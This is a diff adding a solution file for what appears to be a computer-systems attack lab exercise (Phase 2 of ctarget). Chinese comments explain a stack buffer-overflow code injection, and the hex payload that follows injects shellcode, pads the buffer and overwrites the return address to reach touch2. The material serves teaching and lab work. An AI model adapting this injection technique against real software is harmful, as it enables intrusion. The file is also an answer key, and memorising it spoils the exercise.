@@ -1,0 +1,52 @@
+/* ===========================================================================
+ * Phase 2: 代码注入 — 传入 cookie 参数后跳转到 touch2
+ * 目标程序: ctarget (无 ASLR, 栈可执行)
+ *
+ * 攻击原理:
+ *   touch2 不仅需要被跳转到，还需要 %rdi 寄存器持有 cookie 值。
+ *   cookie 是 lab 分配的身份标识（0x59b997fa），touch2 内部会
+ *   cmp cookie, %edi 来验证。
+ *
+ *   仅改返回地址不够（Phase 1 的做法），因为无法设置寄存器。
+ *   需要在栈上注入一段机器码：先 mov cookie→%rdi，再跳到 touch2。
+ *   返回地址指向这段机器码的起始位置（buf 的栈地址）。
+ *
+ * Q: CPU 为什么会执行栈上的代码？
+ * A: CPU 不关心代码在哪——它只根据 %rip 取指令。Gets 把我们的机器码字节
+ *    原样写到栈上的 buf 里。getbuf 的 ret 把 buf 地址弹出到 %rip，
+ *    CPU 就无条件从栈上取指令执行。ctarget 的栈没有 NX 保护，允许这样做。
+ *
+ * Q: 机器码是怎么得来的？
+ * A: 写汇编 → gcc -c 编译 → objdump -d 提取字节：
+ *    mov $0x59b997fa, %rdi  → 48 c7 c7 fa 97 b9 59  (7 字节)
+ *    push $0x4017ec          → 68 ec 17 40 00        (5 字节)
+ *    ret                     → c3                    (1 字节)
+ *    push+ret 组合 = 手动模拟 call 指令，效果等同于 jmp touch2
+ *
+ * Q: buf 的栈地址 0x5561dc78 怎么来的？
+ * A: 用 GDB 断在 getbuf 的 sub $0x28,%rsp 之后，print $rsp。
+ *    ctarget 没有 ASLR，栈地址固定不变，多次运行都是 0x5561dc78。
+ *
+ * Q: 为什么 touch2 读的是 %edi 而不是 %rsi？
+ * A: System V AMD64 调用约定：第一个参数在 %rdi（%edi 是其低 32 位）。
+ *    从 touch2 反汇编 "cmp 0x6044e4,%edi" 可以确认它比较的是 %edi。
+ *
+ * 栈布局:
+ *   BUF+0x00 ┌── 机器码(13B) ──┐  mov cookie→%rdi; push touch2; ret
+ *   BUF+0x0d ├── 填充(27B)  ──┤
+ *   BUF+0x28 └── BUF地址(8B) ──┘  0x5561dc78 (小端序)
+ *
+ * 执行流:
+ *   Gets读入 → getbuf的ret → 跳到栈上机器码 → mov→rdi, push+ret → touch2
+ *   touch2: cmp cookie, %edi → 匹配 → PASS
+ *
+ * 测试: cat phase2.txt | ./target1/hex2raw | ./target1/ctarget -q
+ * =========================================================================== */
+
+48 c7 c7 fa 97 b9 59    /* mov $0x59b997fa, %rdi  (7 字节) */
+68 ec 17 40 00          /* push $0x4017ec         (5 字节) */
+c3                      /* ret                    (1 字节) */
+00 00 00 00 00 00 00 00 00 00  /* 填充 */
+00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00          /* 填充结束，前 40 字节填满 buf */
+78 dc 61 55 00 00 00 00  /* 返回地址 → BUF (0x5561dc78, 小端序) */
